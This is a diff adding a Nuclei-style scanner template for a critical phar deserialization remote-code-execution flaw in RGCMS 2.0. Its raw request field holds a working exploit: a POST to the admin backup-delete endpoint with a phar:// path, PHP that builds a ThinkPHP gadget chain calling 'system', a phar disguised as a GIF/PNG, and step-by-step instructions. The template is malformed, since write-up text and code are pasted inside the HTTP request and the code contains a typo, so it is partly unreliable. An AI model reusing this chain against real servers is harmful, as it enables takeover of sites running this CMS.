@@ -1,0 +1,19 @@
+id: poc-iw6mdun49r2768k0
+info:
+  name: RGCMS2.0存在phar反序列化漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iw6mdun49r2768k0'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: iw6mdun49r2768k0
+    fofa: '"RGCMS"'
+http:
+- raw:
+  - "POST /admin.php/data/delbackup HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 212\nOrigin: http://rgcms:81\nConnection: close\nReferer: http://rgcms:81/admin.php/data/backuplist\nCookie: PHPSESSID=us9vfbgeh2i9c5kcp7h27ii8ns\nPriority: u=0\n\ntitle=20240820110529_rgcms.db&path=phar://upload/image/20240820/2057e04b4b2d528ed7726d233fc87191.png&children=&mtime=2024-08-20+11%3A05%3A29&size=1.09MB&type=file&ext=db&isReadable=true&isWritable=true&edit=false\n\n生成phar文件\n<?php\nnamespace think\\process\\pipes {\n    class Windows\n    {\n        private $files;\n        public function __construct($files)\n        {\n            $this->files = array($files);\n        }\n    }\n}\n\nnamespace think\\model\\concern {\n    trait Conversion\n    {\n        protected $append = array(\"smi1e\" => \"1\");\n    }\n\n    trait Attribute\n    {\n        private $data;\n        private $withAttr = array(\"smi1e\" => \"system\");\n\n        public function get()\n        {\n            $this->data = array(\"smi1e\" => \"calc\");\n        }\n    }\n}\nnamespace think {\n    abstract class Model\n    {\n        use model\\concern\\Attribute;\n        use model\\concern\\Conversion;\n    }\n}\n\nnamespace think\\model{\n    use think\\Model;\n    class Pivot extends Model\n    {\n        public function __construct()\n        {\n            $this->get();\n        }\n    }\n}\n\nnamespace {\n\n    $conver = newthink\\model\\Pivot();\n    $a = new think\\process\\pipes\\Windows($conver);\n\n\n    $phar = new Phar('hkey.phar');\n    $phar -> stopBuffering();\n    $phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');\n    $phar -> addFromString('test.txt','test');\n    $phar -> setMetadata($a);\n    $phar -> stopBuffering();\n}\n?>\n\n把hkey.phar文件名修改为hkey.png\n安装时RGCMS时选择数据库类型为：Sqlite\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739274086338-d0558f39-e084-4301-b96b-4dfc16f4212a.png)\n来到备份修复功能\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739274086611-7b397977-36cf-4b4f-a54d-241bb23893db.png)\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739274086899-a9487c44-296d-42d5-a669-16d2bd0f053a.png)\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739274087148-7077e8a3-c126-426d-9901-890fac9c5343.png)\n将数据包中path参数修改为\nphar://upload/image/20240820/2057e04b4b2d528ed7726d233fc87191.png\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739274087410-67f726d3-36e8-4a06-b233-b3f8c444cef6.png)"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
